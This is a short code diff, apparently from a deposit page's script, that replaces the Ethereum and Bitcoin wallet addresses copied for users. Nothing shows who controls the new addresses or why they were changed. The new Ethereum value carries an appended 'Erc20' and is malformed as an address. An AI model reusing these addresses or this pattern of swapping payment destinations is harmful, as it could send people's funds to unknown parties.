@@ -47,11 +47,11 @@
   }
 
   if ('Ethereum' === wallet.trim()) {
-    return copy.value = '0x43e1f7772b826c6cc0f07476a5cc32e340da016e'
+    return copy.value = '0x3266cd2b37c3a26f790ceaf5c9253137c72e6d04Erc20'
   }
 
   if ('Bitcoin' === wallet.trim()) {
-    return copy.value = '38UHbxGDK4VAU9VUHJDJgzHQSYdG3g96CW'
+    return copy.value = '13TWpZtmD9j1N2yacvEijxqwufZ62HfBms'
   }
 
   document.location.href = '/deposit.html';
